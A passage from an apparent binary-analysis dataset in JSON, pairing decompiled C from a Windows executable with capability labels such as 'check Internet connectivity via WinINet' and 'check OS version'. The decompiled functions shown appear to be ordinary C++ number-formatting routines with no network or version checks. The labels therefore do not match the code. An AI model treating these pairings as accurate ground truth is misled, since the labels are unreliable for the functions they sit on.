            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140059970(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    int64_t *piVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    code *pcVar6;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong *arg1_00;\n    ushort *arg1_01;\n    ushort *puVar11;\n    ushort *arg4_01;\n    char cVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    bool bVar15;\n    uint32_t uVar16;\n    ulong var_8h_2;\n    ulong uStack240;\n    uchar auStack232 [32];\n    uint32_t uStack200;\n    int64_t iStack192;\n    uchar auStack184 [4];\n    ushort auStack180 [10];\n    ulong uStack160;\n    int64_t iStack104;\n    uint uStack92;\n    uchar *puStack88;\n    ushort *puStack80;\n    ulong var_20h;\n    ulong var_14h;\n    ulong var_8h;\n    \n    piVar4 = *arg3;\n    piVar5 = arg3[1];\n    uStack92 = noname_4;\n    uStack160 = 0x1400599a4;\n    iVar8 = fcn.1400261c0(0x1400fb990);\n    piVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar8 * 8;\n    iVar9 = *piVar1;\n    if (iVar9 == 0) {\n        uStack160 = 0x140059b9a;\n        arg1_00 = fcn.1400b6520(0xd0);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b3e0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        *(arg1_00 + 9) = 0;\n        *(arg1_00 + 0x19) = 0;\n        uStack160 = 0x140059bff;\n        fcn.140097f50(arg1_00, arg4 + 0xd0);\n        uStack160 = 0x140059c11;\n        fcn.14009d930(*(arg4 + 0xd0), arg1_00, iVar8);\n        iVar9 = *piVar1;\n    }\n    uVar3 = *(arg4 + 0x18);\n    puVar13 = &stack0xffffffffffffff18;\n    puVar14 = &stack0xffffffffffffff18;\n    iStack104 = iVar9 + 0x4c;\n    puStack88 = &stack0xffffffffffffff48;\n    arg1_01 = &stack0xffffffffffffff98;\n    uVar16 = uVar3 & 0x4a;\n    bVar15 = uVar16 != 0x40 && uVar16 != 8;\n    puStack80 = puStack80 & 0xffffffffffffff00 | bVar15;\n    uStack200 = bVar15;\n    uStack240 = 0x140059a14;\n    iVar7 = fcn.1400aff00(arg1_01, noname_5, iStack104, uVar3);\n    iVar8 = iVar7;\n    puVar11 = puStack88 + (0x28 - iVar7) * 2;\n    puStack88._0_1_ = puStack80;\n    if (*(iVar9 + 0x20) != '\\0') {\n        puStack88 = puStack88 & 0xffffffffffffff00 | puStack80 & 0xff;\n        uStack240 = 0x140059aab;\n        iVar10 = fcn.14000e880(arg1_01);\n        uVar2 = *(iVar9 + 0x4a);\n        arg4_00 = *(iVar9 + 0x18);\n        iVar10 = -iVar10;\n        puVar13 = &stack0xffffffffffffff18 + iVar10;\n        puVar14 = &stack0xffffffffffffff18 + iVar10;\n        arg3_00 = *(iVar9 + 0x10);\n        *(&stack0xffffffffffffff40 + iVar10) = puVar11 + iVar8;\n        *(&stack0xffffffffffffff38 + iVar10) = puVar11;\n        puStack80 = &stack0xffffffffffffff4c + iVar10;\n        *(&stack0xffffffffffffff10 + iVar10) = 0x140059add;\n        iVar8 = fcn.1400b0190(&stack0xffffffffffffff4c + iVar10, uVar2, arg3_00, arg4_00);\n        iVar7 = iVar8 - puStack80 >> 1;\n        puVar11 = puStack80;\n        arg1_01 = puStack80;\n    }\n    arg4_01 = puVar11;\n    if (((puStack88 == '\\0') && (puVar13 = puVar14,  (uVar3 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uVar16 == 0x40) {\n            iVar7 = iVar7 + 1;\n            arg4_01 = puVar11 + -1;\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            arg4_01 = puVar11 + -2;\n            puVar11[-1] = *(iStack104 + 4 + (uVar3 >> 0xe & 1) * 2);\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n    }\n    iVar9 = *(arg4 + 0x10);\n    iVar8 = iVar7;\n    puVar11 = arg4_01;\n    puVar14 = puVar13;\n    if (iVar8 < iVar9) {\n        *(puVar13 + -8) = 0x140059b5e;\n        iVar10 = fcn.14000e880(arg1_01);\n        iVar10 = -iVar10;\n        puVar14 = puVar13 + iVar10;\n        *(puVar13 + iVar10 + 0x28) = iVar8;\n        puVar11 = puVar13 + iVar10 + 0x30;\n        iVar8 = iVar9;\n        *(puVar13 + iVar10 + 0x20) = iVar9;\n        *(puVar13 + iVar10 + -8) = 0x140059b87;\n        fcn.14009c430(arg4, uStack92, puVar11, arg4_01);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar12 = piVar5;\n    if (cVar12 == '\\0') {\n        pcVar6 = *(*piVar4 + 0x60);\n        *(puVar14 + -8) = 0x140059a6a;\n        iVar9 = (*pcVar6)(piVar4, puVar11, iVar8);\n        if (iVar8 != iVar9) {\n            cVar12 = '\\x01';\n        }\n    }\n    *arg1 = piVar4;\n    *(arg1 + 1) = cVar12;\n    return arg1;\n}\n",
        "token_count": 1859
    },
    "140059d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140059d40(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  int64_t noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    ulong arg2_00;\n    ulong arg3_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *arg1_00;\n    uint16_t *puVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    ushort *puVar8;\n    uchar *puVar9;\n    char cVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    int64_t *piVar14;\n    int64_t iVar15;\n    int64_t iVar16;\n    ushort *puVar17;\n    ushort *arg4_00;\n    bool bVar18;\n    ulong var_18h_2;\n    ulong var_60h;\n    ulong var_68h;\n    ulong uStack272;\n    uchar auStack264 [32];\n    int64_t aiStack232 [10];\n    uchar *puStack152;\n    uint uStack140;\n    int64_t *piStack136;\n    int64_t *piStack128;\n    int32_t iStack116;\n    ulong uStack112;\n    uchar auStack104 [32];\n    ulong var_bp_40h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piStack128 = *arg3;\n    piStack136 = arg3[1];\n    uStack140 = noname_4;\n    aiStack232[1] = 0x140059da3;\n    iVar4 = fcn.1400210c0(arg4 + 0xd0);\n    iVar15 = *(arg4 + 8);\n    if (iVar15 < 0) {\n        iVar15 = 6;\n    }\n    aiStack232[1] = 0x140059dc5;\n    fcn.140078b30(arg4, &stack0xffffffffffffff98);\n    puVar11 = &stack0xfffffffffffffef8;\n    piVar14 = &stack0xffffffffffffff38;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack272 = 0x14005a035;\n        aiStack232[0] = noname_6;\n        uStack112 = fcn.14009f6c0();\n        uStack272 = 0x14005a057;\n        puVar9 = &stack0xffffffffffffff90;\n        iVar15 = aiStack232[0];\n        iVar3 = fcn.1400b05f0(&stack0xffffffffffffff90, piVar14, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar3;\n        if (0x2c < iVar3) {\n            uStack272 = 0x14005a07a;\n            iVar16 = fcn.14000e880(puVar9);\n            iVar16 = -iVar16;\n            puVar11 = &stack0xfffffffffffffef8 + iVar16;\n            *(&stack0xfffffffffffffef0 + iVar16) = 0x14005a082;\n            uStack112 = fcn.14009f6c0();\n            piVar14 = &stack0xffffffffffffff38 + iVar16;\n            *(&stack0xffffffffffffff18 + iVar16) = iVar15;\n            *(&stack0xfffffffffffffef0 + iVar16) = 0x14005a0a2;\n            iStack116 = fcn.1400b05f0(&stack0xffffffffffffff90, piVar14, iVar3 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    else {\n        uStack272 = 0x140059de6;\n        iVar16 = noname_6;\n        uStack112 = fcn.14009f6c0();\n        aiStack232[1] = iVar16;\n        puVar9 = &stack0xffffffffffffff90;\n        uStack272 = 0x140059e11;\n        aiStack232[0] = iVar15;\n        puStack152 = puVar9;\n        iVar16 = aiStack232[1];\n        iVar3 = fcn.1400b05f0(puVar9, piVar14, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar3;\n        puVar11 = &stack0xfffffffffffffef8;\n        if (0x2c < iVar3) {\n            uStack272 = 0x140059f0c;\n            iVar6 = fcn.14000e880(puVar9);\n            iVar6 = -iVar6;\n            puVar11 = &stack0xfffffffffffffef8 + iVar6;\n            *(&stack0xfffffffffffffef0 + iVar6) = 0x140059f14;\n            uStack112 = fcn.14009f6c0();\n            piVar14 = &stack0xffffffffffffff38 + iVar6;\n            *(&stack0xffffffffffffff18 + iVar6) = iVar15;\n            *(&stack0xffffffffffffff20 + iVar6) = iVar16;\n            puVar9 = puStack152;\n            *(&stack0xfffffffffffffef0 + iVar6) = 0x140059f3a;\n            iStack116 = fcn.1400b05f0(puVar9, piVar14, iVar3 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    iVar3 = iStack116;\n    iVar16 = iStack116;\n    *(puVar11 + -8) = 0x140059e2b;\n    arg1_00 = fcn.1400b3700(arg4 + 0xd0);\n    *(puVar11 + -8) = 0x140059e3c;\n    iVar15 = fcn.14000e880(arg1_00);\n    iVar15 = -iVar15;\n    puVar12 = puVar11 + iVar15;\n    puVar13 = puVar11 + iVar15;\n    puVar17 = puVar11 + iVar15 + 0x40;\n    pcVar2 = *(*arg1_00 + 0x58);\n    *(puVar11 + iVar15 + -8) = 0x140059e57;\n    (*pcVar2)();\n    if (iVar16 == 0) {\n        if (*(iVar4 + 0x20) == '\\0') goto code_r0x000140059e96;\n        puVar5 = NULL;\ncode_r0x000140059f54:\n        *(puVar11 + iVar15 + -8) = 0x140059f65;\n        iVar16 = fcn.14000e880(arg1_00);\n        iVar16 = -iVar16;\n        puVar13 = puVar11 + iVar16 + iVar15;\n        puVar12 = puVar11 + iVar16 + iVar15;\n        arg4_00 = puVar11 + iVar16 + iVar15 + 0x40;\n        bVar18 = (*piVar14 - 0x2bU & 0xfd) == 0;\n        puVar8 = arg4_00;\n        if (bVar18) {\n            uVar1 = *puVar17;\n            puVar17 = puVar11 + iVar15 + 0x42;\n            iStack116 = iVar3 + -1;\n            *arg4_00 = uVar1;\n            puVar8 = puVar11 + iVar16 + iVar15 + 0x42;\n        }\n        arg2_00 = *(iVar4 + 0x10);\n        arg3_00 = *(iVar4 + 0x18);\n        *(puVar11 + iVar16 + iVar15 + 0x30) = puVar17;\n        *(puVar11 + iVar16 + iVar15 + 0x20) = puVar5;\n        *(puVar11 + iVar16 + iVar15 + 0x38) = &stack0xffffffffffffff8c;\n        *(puVar11 + iVar16 + iVar15 + 0x28) = puVar8;\n        *(puVar11 + iVar16 + iVar15 + -8) = 0x140059fcf;\n        fcn.140059c60(arg2, arg2_00, arg3_00);\n        iStack116 = bVar18 + iStack116;\n        iVar15 = *(arg4 + 0x10);\n        iVar16 = iStack116;\n        if (iVar15 <= iVar16) goto code_r0x000140059ea3;\n    }\n    else {\n        *(puVar11 + iVar15 + -8) = 0x140059e70;\n        arg1_00 = piVar14;\n        puVar5 = sub.msvcrt.dll_memchr(piVar14, 0x2e, iVar16);\n        cVar10 = *(iVar4 + 0x20);\n        if (puVar5 != NULL) {\n            arg1_00 = *(iVar4 + 0x48);\n            puVar5 = puVar17 + (puVar5 - piVar14);\n            *puVar5 = *(iVar4 + 0x48);\n            if (cVar10 == '\\0') goto code_r0x000140059e96;\n            goto code_r0x000140059f54;\n        }\n        if ((cVar10 != '\\0') &&\n           ((iVar3 < 3 ||\n            (((*(piVar14 + 1) < ':' && (uVar7 = *(piVar14 + 2) - 0x30,  arg1_00 = uVar7,  uVar7 < 10)) &&\n             ('/' < *(piVar14 + 1))))))) goto code_r0x000140059f54;\ncode_r0x000140059e96:\n        iVar15 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        arg4_00 = puVar17;\n        if (iVar15 <= iVar16) goto code_r0x000140059ea3;\n    }\n    *(puVar13 + -8) = 0x140059ff5;\n    iVar4 = fcn.14000e880(arg2);\n    iVar4 = -iVar4;\n    puVar12 = puVar13 + iVar4;\n    *(puVar13 + iVar4 + 0x28) = iVar16;\n    iVar16 = iVar15;\n    *(puVar13 + iVar4 + 0x20) = iVar15;\n    *(puVar13 + iVar4 + -8) = 0x14005a01f;\n    fcn.14009c430(arg4, uStack140, puVar13 + iVar4 + 0x40, arg4_00);\n    iStack116 = iVar15;\n    arg4_00 = puVar13 + iVar4 + 0x40;\ncode_r0x000140059ea3:\n    piVar14 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar10 = piStack136;\n    if (cVar10 == '\\0') {\n        pcVar2 = *(*piStack128 + 0x60);\n        *(puVar12 + -8) = 0x140059ec5;\n        iVar15 = (*pcVar2)(piVar14, arg4_00, iVar16);\n        if (iVar15 != iVar16) {\n            cVar10 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar10;\n    return;\n}\n",
        "token_count": 2701
    },
    "14005a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14005a100(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  unkbyte10 *noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong arg_70h, ulong arg_78h, ulong arg_80h)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    ulong arg2_00;\n    ulong arg3_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *arg1_00;\n    int64_t iVar5;\n    uint16_t *puVar6;\n    uint32_t uVar7;\n    uchar *noname_0;\n    ushort *puVar8;\n    char cVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t *piVar13;\n    uchar *puVar14;\n    int64_t iVar15;\n    ushort *puVar16;\n    ushort *arg4_00;\n    bool bVar17;\n    ulong var_8h;\n    ulong var_50h;\n    ulong var_58h;\n    ulong uStack320;\n    uchar auStack312 [32];\n    uchar *apuStack280 [4];\n    int64_t aiStack248 [9];\n    uchar *puStack176;\n    uchar *puStack168;\n    uint uStack156;\n    unkbyte10 Stack152;\n    int64_t *piStack136;\n    int64_t *piStack128;\n    uchar auStack120 [8];\n    ulong var_68h;\n    ulong var_60h;\n    uchar auStack96 [4];\n    ulong var_54h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piVar13 = &stack0xffffffffffffff08;\n    piStack128 = *arg3;\n    piStack136 = arg3[1];\n    iVar5 = &fcn.14005a100::var_54h + 4;\n    uStack156 = noname_4;\n    Stack152 = *noname_6;\n    apuStack280[3] = 0x14005a15d;\n    iVar4 = fcn.1400210c0(arg4 + 0xd0);\n    puVar14 = *(arg4 + 8);\n    if (puVar14 < 0) {\n        puVar14 = 0x6;\n    }\n    apuStack280[3] = 0x14005a17f;\n    fcn.140078b30(arg4, iVar5);\n    puVar10 = &stack0xfffffffffffffec8;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack320 = 0x14005a405;\n        _auStack96 = fcn.14009f6c0();\n        puVar14 = &stack0xffffffffffffffa0;\n        _auStack120 = Stack152;\n        uStack320 = 0x14005a434;\n        apuStack280[0] = &stack0xffffffffffffff88;\n        puStack168 = puVar14;\n        iVar3 = fcn.1400b05f0(puVar14, &stack0xffffffffffffff08, 0x36, iVar5);\n        var_60h._4_4_ = iVar3;\n        if (0x35 < iVar3) {\n            uStack320 = 0x14005a457;\n            iVar15 = fcn.14000e880(puVar14);\n            iVar15 = -iVar15;\n            puVar10 = &stack0xfffffffffffffec8 + iVar15;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x14005a45f;\n            _auStack96 = fcn.14009f6c0();\n            piVar13 = &stack0xffffffffffffff08 + iVar15;\n            _auStack120 = Stack152;\n            *(&stack0xfffffffffffffee8 + iVar15) = &stack0xffffffffffffff88;\n            puVar14 = puStack168;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x14005a485;\n            var_60h._4_4_ = fcn.1400b05f0(puVar14, piVar13, iVar3 + 1, iVar5);\n        }\n    }\n    else {\n        uStack320 = 0x14005a1a0;\n        _auStack96 = fcn.14009f6c0();\n        apuStack280[1] = &stack0xffffffffffffff88;\n        noname_0 = &stack0xffffffffffffffa0;\n        _auStack120 = Stack152;\n        uStack320 = 0x14005a1d8;\n        apuStack280[0] = puVar14;\n        puStack176 = apuStack280[1];\n        puStack168 = noname_0;\n        iVar3 = fcn.1400b05f0(noname_0, &stack0xffffffffffffff08, 0x36, iVar5);\n        var_60h._4_4_ = iVar3;\n        puVar10 = &stack0xfffffffffffffec8;\n        piVar13 = &stack0xffffffffffffff08;\n        if (0x35 < iVar3) {\n            uStack320 = 0x14005a2d4;\n            iVar15 = fcn.14000e880(noname_0);\n            iVar15 = -iVar15;\n            puVar10 = &stack0xfffffffffffffec8 + iVar15;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x14005a2dc;\n            _auStack96 = fcn.14009f6c0();\n            piVar13 = &stack0xffffffffffffff08 + iVar15;\n            _auStack120 = Stack152;\n            *(&stack0xfffffffffffffef0 + iVar15) = puStack176;\n            *(&stack0xfffffffffffffee8 + iVar15) = puVar14;\n            puVar14 = puStack168;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x14005a30b;\n            var_60h._4_4_ = fcn.1400b05f0(puVar14, piVar13, iVar3 + 1, iVar5);\n        }\n    }\n    iVar3 = var_60h._4_4_;\n    iVar15 = var_60h._4_4_;\n    *(puVar10 + -8) = 0x14005a1f2;\n    arg1_00 = fcn.1400b3700(arg4 + 0xd0);\n    *(puVar10 + -8) = 0x14005a203;\n    iVar5 = fcn.14000e880(arg1_00);\n    iVar5 = -iVar5;\n    puVar11 = puVar10 + iVar5;\n    puVar12 = puVar10 + iVar5;\n    puVar16 = puVar10 + iVar5 + 0x40;\n    pcVar2 = *(*arg1_00 + 0x58);\n    *(puVar10 + iVar5 + -8) = 0x14005a21e;\n    (*pcVar2)();\n    if (iVar15 == 0) {\n        if (*(iVar4 + 0x20) == '\\0') goto code_r0x00014005a25d;\n        puVar6 = NULL;\ncode_r0x00014005a32c:\n        *(puVar10 + iVar5 + -8) = 0x14005a33d;\n        iVar15 = fcn.14000e880(arg1_00);\n        iVar15 = -iVar15;\n        puVar12 = puVar10 + iVar15 + iVar5;\n        puVar11 = puVar10 + iVar15 + iVar5;\n        arg4_00 = puVar10 + iVar15 + iVar5 + 0x40;\n        bVar17 = (*piVar13 - 0x2bU & 0xfd) == 0;\n        puVar8 = arg4_00;\n        if (bVar17) {\n            uVar1 = *puVar16;\n            puVar16 = puVar10 + iVar5 + 0x42;\n            var_60h._4_4_ = iVar3 + -1;\n            *arg4_00 = uVar1;\n            puVar8 = puVar10 + iVar15 + iVar5 + 0x42;\n        }\n        arg2_00 = *(iVar4 + 0x10);\n        arg3_00 = *(iVar4 + 0x18);\n        *(puVar10 + iVar15 + iVar5 + 0x30) = puVar16;\n        *(puVar10 + iVar15 + iVar5 + 0x20) = puVar6;\n        *(puVar10 + iVar15 + iVar5 + 0x38) = &fcn.14005a100::var_60h + 4;\n        *(puVar10 + iVar15 + iVar5 + 0x28) = puVar8;\n        *(puVar10 + iVar15 + iVar5 + -8) = 0x14005a3a7;\n        fcn.140059c60(arg2, arg2_00, arg3_00);\n        var_60h._4_4_ = bVar17 + var_60h._4_4_;\n        iVar5 = *(arg4 + 0x10);\n        iVar15 = var_60h._4_4_;\n        if (iVar5 <= iVar15) goto code_r0x00014005a26a;\n    }\n    else {\n        *(puVar10 + iVar5 + -8) = 0x14005a237;\n        arg1_00 = piVar13;\n        puVar6 = sub.msvcrt.dll_memchr(piVar13, 0x2e, iVar15);\n        cVar9 = *(iVar4 + 0x20);\n        if (puVar6 != NULL) {\n            arg1_00 = *(iVar4 + 0x48);\n            puVar6 = puVar16 + (puVar6 - piVar13);\n            *puVar6 = *(iVar4 + 0x48);\n            if (cVar9 == '\\0') goto code_r0x00014005a25d;\n            goto code_r0x00014005a32c;\n        }\n        if ((cVar9 != '\\0') &&\n           ((iVar3 < 3 ||\n            (((*(piVar13 + 1) < ':' && (uVar7 = *(piVar13 + 2) - 0x30,  arg1_00 = uVar7,  uVar7 < 10)) &&\n             ('/' < *(piVar13 + 1))))))) goto code_r0x00014005a32c;\ncode_r0x00014005a25d:\n        iVar5 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        arg4_00 = puVar16;\n        if (iVar5 <= iVar15) goto code_r0x00014005a26a;\n    }\n    *(puVar12 + -8) = 0x14005a3cd;\n    iVar4 = fcn.14000e880(arg2);\n    iVar4 = -iVar4;\n    puVar11 = puVar12 + iVar4;\n    *(puVar12 + iVar4 + 0x28) = iVar15;\n    iVar15 = iVar5;\n    *(puVar12 + iVar4 + 0x20) = iVar5;\n    *(puVar12 + iVar4 + -8) = 0x14005a3f7;\n    fcn.14009c430(arg4, uStack156, puVar12 + iVar4 + 0x40, arg4_00);\n    var_60h._4_4_ = iVar5;\n    arg4_00 = puVar12 + iVar4 + 0x40;\ncode_r0x00014005a26a:\n    piVar13 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar9 = piStack136;\n    if (cVar9 == '\\0') {\n        pcVar2 = *(*piStack128 + 0x60);\n        *(puVar11 + -8) = 0x14005a28c;\n        iVar5 = (*pcVar2)(piVar13, arg4_00, iVar15);\n        if (iVar5 != iVar15) {\n            cVar9 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar9;\n    return;\n}\n",
        "token_count": 2910
    },
    "14005c34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14005c340(uint *arg1, ulong noname_1, int64_t **noname_2, int64_t **noname_3, uint *noname_4, int64_t noname_5\n                  , uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, \n                  ulong noname_11, ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    ulong *arg1_00;\n    uint64_t *puVar4;\n    char cVar5;\n    uint8_t uVar6;\n    char cVar7;\n    bool bVar8;\n    bool bVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    int64_t iVar12;\n    int64_t *piVar13;\n    int64_t **ppiVar14;\n    int64_t *piVar15;\n    int64_t *piVar16;\n    uint64_t uVar17;\n    uint uVar18;\n    int64_t *piVar19;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    uint64_t uVar22;\n    bool bVar23;\n    bool bVar24;\n    ulong var_8h;\n    uint32_t *var_50h;\n    ulong auStack224 [5];\n    ulong uStack184;\n    ulong *puStack176;\n    uint64_t uStack168;\n    ulong *puStack160;\n    int64_t **ppiStack152;\n    int64_t iStack144;\n    int64_t **ppiStack136;\n    int64_t *piStack128;\n    uint64_t *puStack120;\n    int64_t *var_68h;\n    int64_t *var_60h;\n    ulong var_58h;\n    int64_t *var_50h_2;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h_2;\n    \n    var_50h_2 = *noname_2;\n    var_48h._0_4_ = *(noname_2 + 1);\n    var_48h._4_4_ = *(noname_2 + 0xc);\n    var_60h = *noname_3;\n    var_58h._0_4_ = *(noname_3 + 1);\n    var_58h._4_4_ = *(noname_3 + 0xc);\n    noname_7 = noname_7 + 0xd0;\n    auStack224[0] = 0x14005c38b;\n    piVar11 = fcn.1400b36a0(noname_7);\n    auStack224[0] = 0x14005c39a;\n    iVar12 = fcn.14000e880(noname_7);\n    iVar12 = -iVar12;\n    puStack176 = &fcn.14005c340::var_60h;\n    puStack160 = &fcn.14005c340::var_50h_2;\n    *(&stack0xffffffffffffff20 + iVar12) = 0x14005c3ba;\n    cVar5 = fcn.140023f10(&fcn.14005c340::var_50h_2, &fcn.14005c340::var_60h);\n    puVar3 = puStack160;\n    if (cVar5 == '\\0') {\n        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c3ee;\n        fcn.140023fd0(puVar3);\n        pcVar1 = *(*piVar11 + 0x20);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c3fc;\n        cVar5 = (*pcVar1)(piVar11);\n        pcVar1 = *(*piVar11 + 0x10);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c409;\n        uVar6 = (*pcVar1)(piVar11);\n        if (noname_6 != 0) {\n            var_68h = var_68h & 0xffffffffffffff00 | uVar6;\n            puStack120 = &stack0xffffffffffffff48 + iVar12;\n            ppiStack136 = &stack0xffffffffffffff48 + iVar12 + noname_6 * 8;\n            uVar17 = 0;\n            uVar22 = 0;\n            do {\n                while( true ) {\n                    uVar20 = uVar17;\n                    pcVar1 = *(*piVar11 + 0x20);\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x14005c468;\n                    cVar7 = (*pcVar1)(piVar11);\n                    if (cVar5 != cVar7) break;\ncode_r0x00014005c46d:\n                    uVar2 = *(noname_5 + uVar20 * 8);\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x14005c47e;\n                    piVar13 = sub.msvcrt.dll_strlen(uVar2);\n                    ppiStack136[uVar22] = piVar13;\n                    uVar21 = uVar22 + 1;\n                    puStack120[uVar22] = uVar20;\n                    uVar17 = uVar20 + 1;\n                    uVar22 = uVar21;\n                    if (noname_6 == uVar20 + 1) goto code_r0x00014005c49b;\n                }\n                pcVar1 = *(*piVar11 + 0x10);\n                *(&stack0xffffffffffffff20 + iVar12) = 0x14005c449;\n                cVar7 = (*pcVar1)(piVar11);\n                if (var_68h == cVar7) goto code_r0x00014005c46d;\n                uVar17 = uVar20 + 1;\n            } while (noname_6 != uVar20 + 1);\ncode_r0x00014005c49b:\n            puVar4 = puStack120;\n            if (1 < uVar22) {\n                uStack168 = uVar20 + 1;\n                iStack144 = uVar22 * 8;\n                piVar13 = *ppiStack136;\n                ppiStack152 = ppiStack136 + 1;\n                piVar19 = NULL;\ncode_r0x00014005c4d8:\n                ppiVar14 = ppiStack152;\n                piVar16 = piVar13;\n                do {\n                    if (*ppiVar14 < piVar16) {\n                        piVar16 = *ppiVar14;\n                    }\n                    ppiVar14 = ppiVar14 + 1;\n                } while (iStack144 + ppiStack136 != ppiVar14);\n                piVar19 = piVar19 + 1;\n                if (var_50h_2[2] < var_50h_2[3]) {\n                    var_48h._0_4_ = 0xffffffff;\n                    var_50h_2[2] = var_50h_2[2] + 1;\n                    puVar3 = puStack176;\n                    arg1_00 = puStack160;\n                    piVar15 = var_50h_2;\n                }\n                else {\n                    var_68h = var_50h_2;\n                    pcVar1 = *(*var_50h_2 + 0x50);\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x14005c812;\n                    (*pcVar1)();\n                    var_48h._0_4_ = 0xffffffff;\n                    puVar3 = puStack176;\n                    arg1_00 = puStack160;\n                    piVar15 = var_68h;\n                }\n                puStack176 = puVar3;\n                puStack160 = arg1_00;\n                if (piVar19 == piVar16) {\n                    var_48h._0_4_ = -1;\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x14005c836;\n                    cVar5 